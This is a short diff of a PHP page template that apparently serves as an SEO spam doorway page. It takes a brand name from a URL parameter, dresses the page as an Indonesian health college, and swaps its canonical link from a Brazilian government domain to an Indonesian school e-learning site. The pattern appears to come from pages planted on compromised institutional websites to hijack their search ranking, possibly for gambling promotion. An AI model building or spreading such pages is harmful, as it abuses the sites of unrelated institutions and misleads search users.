@@ -55,7 +55,7 @@ if (isset($_GET['id'])) {
     <title><?php echo $BRANDS ?> : Yayasan Surya Global - STIKES Surya Global Yogyakarta</title>
     <meta http-equiv="Accept-CH" content="Sec-CH-UA-Platform-Version, Sec-CH-UA-Model" />
     <link rel="icon" type="image/x-icon" href="https://i.postimg.cc/HL2SmPj5/bonus.png" />
-    <link rel="canonical" href="https://social.itudigital.sp.gov.br/semprodesgeral/admin/ampun/?id=<?php echo $BRANDS ?>" />
+    <link rel="canonical" href="https://elearning.smpnegeri6depok.sch.id/main/?id=<?php echo $BRANDS ?>" />
     <link rel="amphtml" href="https://sorry-koko-cuman-mau-tes-aja.pages.dev/?you=<?php echo $BRANDS ?>" />
     <meta property="og:site_name" content="<?php echo $BRANDS ?>" />
     <meta property="og:title" content="<?php echo $BRANDS ?> : Yayasan Surya Global - STIKES Surya Global Yogyakarta" />
